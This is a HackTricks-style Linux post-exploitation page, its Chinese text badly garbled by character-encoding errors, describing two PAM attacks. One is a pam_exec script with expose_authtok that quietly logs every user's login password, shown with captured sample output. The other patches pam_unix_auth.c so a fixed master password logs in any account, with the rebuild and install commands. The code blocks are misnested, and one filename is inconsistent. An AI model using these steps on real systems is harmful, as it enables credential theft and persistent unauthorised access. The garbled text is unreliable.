# Linux åæ¸—é€

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä½¿ç”¨ PAM å—…æ¢ç™»å½•å¯†ç 

è®©æˆ‘ä»¬é…ç½®ä¸€ä¸ª PAM æ¨¡å—ï¼Œä»¥è®°å½•æ¯ä¸ªç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨çš„æ¯ä¸ªå¯†ç ã€‚å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ PAMï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª bash è„šæœ¬ï¼Œæ¯å½“å‘ç”Ÿæ–°çš„è®¤è¯æ—¶å°†è°ƒç”¨è¯¥è„šæœ¬ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
å˜é‡æ˜¯PAMç‰¹å®šçš„ï¼Œå°†é€šè¿‡`pam_exec.so`æ¨¡å—å˜å¾—å¯ç”¨ã€‚

ä»¥ä¸‹æ˜¯å˜é‡çš„å«ä¹‰ï¼š

* **$PAM\_USERï¼š** è¾“å…¥çš„ç”¨æˆ·åã€‚
* **$PAM\_RHOSTï¼š** è¿œç¨‹ä¸»æœºï¼ˆé€šå¸¸æ˜¯IPåœ°å€ï¼‰
* **$(cat -)ï¼š** è¿™ä¼šè¯»å–`stdin`ï¼Œå¹¶å°†åŒ…å«è„šæœ¬æŠ“å–çš„å¯†ç 
* ç»“æœè¢«ç®¡é“ä¼ è¾“åˆ°ä½äº`/var/log/toomanysecrets.log`çš„æ—¥å¿—æ–‡ä»¶ä¸­

ä¸ºäº†**é˜²æ­¢æ‰€æœ‰ç”¨æˆ·è¯»å–**æ–‡ä»¶ï¼Œè¯·è€ƒè™‘é¢„å…ˆåˆ›å»ºå®ƒå¹¶è¿è¡Œ`chmod`ï¼Œä¾‹å¦‚ï¼š
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
```
æ¥ä¸‹æ¥ï¼Œéœ€è¦æ›´æ–°PAMé…ç½®æ–‡ä»¶ï¼Œå°†ä½¿ç”¨`pam_exec`æ¨¡å—æ¥è°ƒç”¨è„šæœ¬ã€‚

åœ¨`/etc/pam.d/`ç›®å½•ä¸‹æœ‰å¤šä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬é€‰æ‹©`common-auth`ã€‚
```
```
sudo nano /etc/pam.d/common-auth
```
åœ¨æ–‡ä»¶çš„æœ€åº•éƒ¨æ·»åŠ ä»¥ä¸‹è®¤è¯æ¨¡å—ï¼š

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

é€‰é¡¹çš„å«ä¹‰å¦‚ä¸‹ï¼š

* **optional:** å¦‚æœå‡ºç°é”™è¯¯ï¼Œè®¤è¯ä¸åº”è¯¥å¤±è´¥ï¼ˆè¿™ä¸æ˜¯å¿…éœ€çš„æ­¥éª¤ï¼‰
* **pam\_exec.so:** è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è°ƒç”¨ä»»æ„è„šæœ¬çš„PAMæ¨¡å—
* **expose\_authtok:** è¿™ä¸ªæŠ€å·§å…è®¸é€šè¿‡`stdin`è¯»å–å¯†ç 
* **quiet:** å¦‚æœå‡ºç°é—®é¢˜ï¼Œä¸å‘ç”¨æˆ·æ˜¾ç¤ºä»»ä½•é”™è¯¯
* æœ€åä¸€ä¸ªå‚æ•°æ˜¯ä¹‹å‰åˆ›å»ºçš„shellè„šæœ¬

![](<../../.gitbook/assets/image (375).png>)

æœ€åï¼Œä½¿æ–‡ä»¶å¯æ‰§è¡Œï¼š

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

ç°åœ¨ï¼Œè®©æˆ‘ä»¬å°è¯•ä»å¦ä¸€å°æœºå™¨sshè¿‡æ¥ï¼Œæˆ–è€…åœ¨æœ¬åœ°ç™»å½•ã€‚

ç„¶åæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### åé—¨ PAM

è®©æˆ‘ä»¬è½¬åˆ° PAM çš„æºä»£ç ï¼ˆå–å†³äºä½ çš„å‘è¡Œç‰ˆï¼Œè¯·é€‰æ‹©ä¸ä½ çš„ç‰ˆæœ¬å·ç›¸åŒçš„...ï¼‰ï¼Œå¹¶åœ¨ pam_unix_auth.c æ–‡ä»¶çš„å¤§çº¦170/180è¡Œé™„è¿‘æŸ¥çœ‹ï¼š
```
vi modules/pam_unix/pam_unix_auth.c
```
```markdown
![](../../.gitbook/assets/image (651).png)

è®©æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹æ–¹å¼æ›´æ”¹å®ƒï¼š

![](../../.gitbook/assets/image (638) (2) (2).png)

è¿™å°†å…è®¸ä»»ä½•ä½¿ç”¨**å¯†ç  "0xMitsurugi"** çš„ç”¨æˆ·ç™»å½•ã€‚

é‡æ–°ç¼–è¯‘ `pam_unix_auth.c`ï¼Œå¹¶æ›¿æ¢ pam_unix.so æ–‡ä»¶ï¼š
```
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
æ‚¨å¯ä»¥ä½¿ç”¨ [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
